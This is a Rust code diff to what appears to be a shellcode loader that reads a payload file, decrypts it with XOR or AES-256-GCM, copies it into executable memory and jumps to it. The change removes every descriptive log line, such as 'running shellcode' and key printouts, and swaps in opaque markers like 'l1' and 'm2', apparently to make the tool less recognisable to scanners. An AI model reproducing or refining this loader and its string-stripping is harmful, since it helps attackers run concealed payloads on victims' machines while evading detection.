@@ -37,7 +37,7 @@ impl ShellCode {
         let shellcode = match std::fs::read(input_path) {
             Ok(result) => result,
             Err(error) => {
-                println!("[+] failed to read shellcode : {:?}", error);
+                println!("[+] failed to read  : {:?}", error);
                 std::process::exit(0x0100);
             }
         };
@@ -45,10 +45,10 @@ impl ShellCode {
         let file_args = shellcode.split(|e| *e == 0).collect::<Vec<_>>();
 
         if file_args.len() == 1 {
-            println!("[+] shellcode must be raw/normal");
+            println!("[+]");
             ShellCode { sc: shellcode }
         } else if std::str::from_utf8(file_args[1]).unwrap() == "m1" {
-            println!("[+] shellcode dectected as XOR encrypted");
+            println!("[+]");
 
             let my_xored_shellcode = XoredShellCode {
                 sc: ShellCode {
@@ -60,7 +60,7 @@ impl ShellCode {
 
             decrypted_sc
         } else if std::str::from_utf8(&file_args[1]).unwrap() == "m2" {
-            println!("[+] shellcode dectected as AES encrypted");
+            println!("[+] m2");
 
             let my_aes_shellcode = AESShellCode {
                 sc: ShellCode {
@@ -75,7 +75,7 @@ impl ShellCode {
 
             decrypted_sc
         } else {
-            println!("[+] shellcode must be raw/normal");
+            println!("[+]");
             ShellCode { sc: shellcode }
         }
     }
@@ -87,9 +87,9 @@ impl ShellCode {
 
         unsafe {
             std::ptr::copy(self.sc.as_ptr(), map.data(), self.sc.len());
-            println!("[+] set memory protections at {:p}", self.sc.as_ptr());
+            println!("[+] l1");
             let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.data());
-            println!("[+] running shellcode");
+            println!("[+]l2");
             exec_shellcode();
         }
     }
@@ -104,11 +104,8 @@ impl XoredShellCode {
             .map(char::from)
             .collect();
 
-        println!("[+] encrypting shellcode using XOR");
-        println!(
-            "[+] xor_key (first 5 bytes): {:#04X?}",
-            xor_key.as_bytes().to_vec()[0..5].to_vec()
-        );
+        println!("[+]");
+        println!("[+]");
         for xor_char in xor_key.chars() {
             if xor_char != ' ' {
                 for (index, value) in sc_bytearray.sc.iter().enumerate() {
@@ -127,11 +124,8 @@ impl XoredShellCode {
 
     pub fn xor(self) -> ShellCode {
         let mut xored_shellcode = self.sc.sc.clone();
-        println!("[+] encrypting shellcode using XOR");
-        println!(
-            "[+] xor_key (first 5 bytes): {:#04X?}",
-            self.xor_key.as_bytes().to_vec()[0..5].to_vec()
-        );
+        println!("[+]");
+        println!("[+]");
         for xor_char in self.xor_key.chars() {
             if xor_char != ' ' {
                 for (index, value) in self.sc.sc.iter().enumerate() {
@@ -153,7 +147,7 @@ impl XoredShellCode {
         {
             Ok(result) => result,
             Err(_error) => {
-                println!("[+] output path {} already exists", output_path);
+                println!("[+]");
                 std::process::exit(0x0100);
             }
         };
@@ -167,7 +161,7 @@ impl XoredShellCode {
         final_output.extend(&self.sc.sc);
 
         file.write_all(&final_output).unwrap();
-        println!("[+] wrote XOR encrypted shellcode to {}", output_path);
+        println!("[+]");
     }
 }
 
@@ -189,19 +183,7 @@ impl AESShellCode {
         let mut sc_copy = sc_bytearray;
         cipher.encrypt_in_place(nonce, &rand_assoc_data, &mut sc_copy.sc);
 
-        println!("[+] encrypting shellcode using AES");
-        println!(
-            "[+] key: (first 5 bytes) {:#04X?}",
-            key.clone()[0..5].to_vec()
-        );
-        println!(
-            "[+] nonce: (first 5 bytes) {:#04X?}",
-            rand_nonce.clone()[0..5].to_vec()
-        );
-        println!(
-            "[+] assoc_data: (first 5 bytes) {:#04X?}",
-            rand_assoc_data.clone()[0..5].to_vec()
-        );
+       
 
         AESShellCode {
             sc: sc_copy,
@@ -212,17 +194,7 @@ impl AESShellCode {
     }
 
     pub fn decrypt(mut self) -> ShellCode {
-        println!("[+] decrypting shellcode using AES");
-        println!("[+] key: (first 5 bytes) {:#04X?}", self.key[0..5].to_vec());
-        println!(
-            "[+] nonce: (first 5 bytes) {:#04X?}",
-            self.nonce[0..5].to_vec()
-        );
-        println!(
-            "[+] assoc_data: (first 5 bytes) {:#04X?}",
-            self.assoc_data[0..5].to_vec()
-        );
-
+      
         let cipher = Aes256Gcm::new_from_slice(&self.key).unwrap();
         let nonce = Nonce::from_slice(&self.nonce);
         cipher.decrypt_in_place(nonce, &self.assoc_data, &mut self.sc.sc);
@@ -238,7 +210,7 @@ impl AESShellCode {
         {
             Ok(result) => result,
             Err(_error) => {
-                println!("[+] output path {} already exists", output_path);
+                println!("[+]");
                 std::process::exit(0x0100);
             }
         };
@@ -256,6 +228,6 @@ impl AESShellCode {
         final_output.extend(&self.sc.sc);
 
         file.write_all(&final_output).unwrap();
-        println!("[+] wrote AES encrypted shellcode to {}", output_path);
+        println!("[+]");
     }
 }
